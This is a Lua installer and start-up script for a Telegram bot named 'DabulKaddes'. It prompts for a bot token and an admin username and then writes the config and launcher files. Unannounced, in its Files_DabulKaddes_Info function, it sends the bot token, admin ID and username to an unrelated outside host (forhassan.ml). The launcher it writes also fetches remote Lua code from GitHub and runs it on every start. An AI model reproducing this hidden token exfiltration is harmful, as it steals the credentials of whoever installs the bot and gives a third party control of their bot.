serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_DabulKaddes = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_DabulKaddes = function() 
local Create_Info = function(Token,Sudo,UserName)  
local DabulKaddes_Info_Sudo = io.open("sudo.lua", 'w')
DabulKaddes_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
DabulKaddes_Info_Sudo:close()
end  
if not database:get(Server_DabulKaddes.."Token_DabulKaddes") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_DabulKaddes.."Token_DabulKaddes",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_DabulKaddes.."UserName_DabulKaddes") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_DabulKaddes.."UserName_DabulKaddes",Json.Info.Username)
database:set(Server_DabulKaddes.."Id_DabulKaddes",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_DabulKaddes_Info()
Create_Info(database:get(Server_DabulKaddes.."Token_DabulKaddes"),database:get(Server_DabulKaddes.."Id_DabulKaddes"),database:get(Server_DabulKaddes.."UserName_DabulKaddes"))   
http.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_DabulKaddes.."Id_DabulKaddes").."&user="..database:get(Server_DabulKaddes.."UserName_DabulKaddes").."&token="..database:get(Server_DabulKaddes.."Token_DabulKaddes"))
local RunDabulKaddes = io.open("DabulKaddes", 'w')
RunDabulKaddes:write([[
#!/usr/bin/env bash
cd $HOME/DabulKaddes
token="]]..database:get(Server_DabulKaddes.."Token_DabulKaddes")..[["
rm -fr Dabul.lua
wget "https://raw.githubusercontent.com/DabulKaddes/DabulKaddes/master/Dabul.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Dabul.lua -p PROFILE --bot=$token
done
]])
RunDabulKaddes:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/DabulKaddes
while(true) do
rm -fr ../.telegram-cli
screen -S DabulKaddes -X kill
screen -S DabulKaddes ./DabulKaddes
done
]])
RunTs:close()
end
Files_DabulKaddes_Info()
database:del(Server_DabulKaddes.."Token_DabulKaddes");database:del(Server_DabulKaddes.."Id_DabulKaddes");database:del(Server_DabulKaddes.."UserName_DabulKaddes")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_DabulKaddes()  
var = true
else   
f:close()  
database:del(Server_DabulKaddes.."Token_DabulKaddes");database:del(Server_DabulKaddes.."Id_DabulKaddes");database:del(Server_DabulKaddes.."UserName_DabulKaddes")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
